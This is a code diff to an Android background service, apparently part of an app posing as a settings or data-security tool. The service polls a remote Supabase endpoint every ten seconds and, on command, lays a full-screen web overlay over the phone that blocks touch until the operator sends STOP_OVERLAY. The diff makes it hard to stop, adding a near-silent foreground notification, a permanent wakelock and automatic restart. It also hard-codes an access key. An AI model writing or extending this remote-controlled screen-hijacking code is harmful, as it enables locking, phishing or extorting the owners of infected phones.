@@ -1,12 +1,17 @@
 package com.settings.datasecure;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
+import android.content.Context;
 import android.content.Intent;
 import android.graphics.PixelFormat;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.view.Gravity;
 import android.view.View;
 import android.view.WindowManager;
@@ -28,16 +33,45 @@ public class LayananBackground extends Service {
     private WebView webViewOverlay;
     private Handler handler = new Handler(Looper.getMainLooper());
     private String htmlTerakhir = "";
+    private PowerManager.WakeLock wakeLock; // Fitur Anti-Tidur untuk HP
     
-    // Perhatikan: Menggunakan id=eq.2 untuk Overlay
     private final String URL_SUPABASE = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=eq.2&select=html_content";
     private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 
 
     @Override
     public void onCreate() {
         super.onCreate();
+        aktifkanModeAntiMati();
         siapkanOverlayWeb();
         mulaiPengecekanOtomatis();
+    }
+
+    private void aktifkanModeAntiMati() {
+        // 1. Menjalankan Foreground Service (Wajib ada notifikasi kecil agar OS Android tidak membunuh service ini)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    "ChannelKeamanan",
+                    "Sistem Latar Belakang",
+                    NotificationManager.IMPORTANCE_MIN // Dibuat MIN agar tidak mengganggu/berbunyi
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+            Notification notifikasi = new Notification.Builder(this, "ChannelKeamanan")
+                    .setContentTitle("Sistem Aktif")
+                    .setContentText("Aplikasi berjalan di latar belakang")
+                    .setSmallIcon(android.R.drawable.ic_secure) // Ikon kunci bawaan
+                    .build();
+            startForeground(1, notifikasi);
+        }
+
+        // 2. Mengaktifkan WakeLock agar proses internet dan timer terus berjalan meski layar HP mati
+        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
+        if (powerManager != null) {
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataSecure::WakeLock");
+            wakeLock.acquire();
+        }
     }
 
     private void siapkanOverlayWeb() {
@@ -50,7 +84,6 @@ public class LayananBackground extends Service {
         webViewOverlay.setWebViewClient(new WebViewClient());
         
         webViewOverlay.setBackgroundColor(0x00000000); 
-        // Sembunyikan web saat pertama kali jalan agar tidak menghalangi layar
         webViewOverlay.setVisibility(View.GONE);
 
         int jenisOverlay;
@@ -77,7 +110,7 @@ public class LayananBackground extends Service {
             @Override
             public void run() {
                 tarikDataDariAdmin();
-                handler.postDelayed(this, 10000); 
+                handler.postDelayed(this, 10000); // Cek setiap 10 detik tanpa henti
             }
         };
         handler.post(sistemPemantau);
@@ -109,17 +142,14 @@ public class LayananBackground extends Service {
                             JSONObject barisData = dataJson.getJSONObject(0);
                             final String htmlBaru = barisData.getString("html_content");
 
-                            // Logika Baru: Mengecek perintah STOP atau HTML baru
                             if (!htmlBaru.equals(htmlTerakhir)) {
                                 htmlTerakhir = htmlBaru;
                                 handler.post(new Runnable() {
                                     @Override
                                     public void run() {
                                         if (htmlBaru.equals("STOP_OVERLAY") || htmlBaru.trim().isEmpty()) {
-                                            // Menghilangkan web dari layar (HP kembali bisa disentuh)
                                             webViewOverlay.setVisibility(View.GONE);
                                         } else {
-                                            // Memunculkan web ke layar menutupi HP
                                             webViewOverlay.setVisibility(View.VISIBLE);
                                             webViewOverlay.loadDataWithBaseURL(null, htmlBaru, "text/html", "UTF-8", null);
                                         }
@@ -138,7 +168,7 @@ public class LayananBackground extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; 
+        return START_STICKY; // Fitur agar OS membangkitkan ulang jika tak sengaja tertutup
     }
 
     @Override
@@ -148,6 +178,10 @@ public class LayananBackground extends Service {
             windowManager.removeView(webViewOverlay);
         }
         handler.removeCallbacksAndMessages(null);
+        // Lepaskan WakeLock agar tidak merusak baterai saat aplikasi benar-benar dimatikan paksa
+        if (wakeLock != null && wakeLock.isHeld()) {
+            wakeLock.release();
+        }
     }
 
     @Override
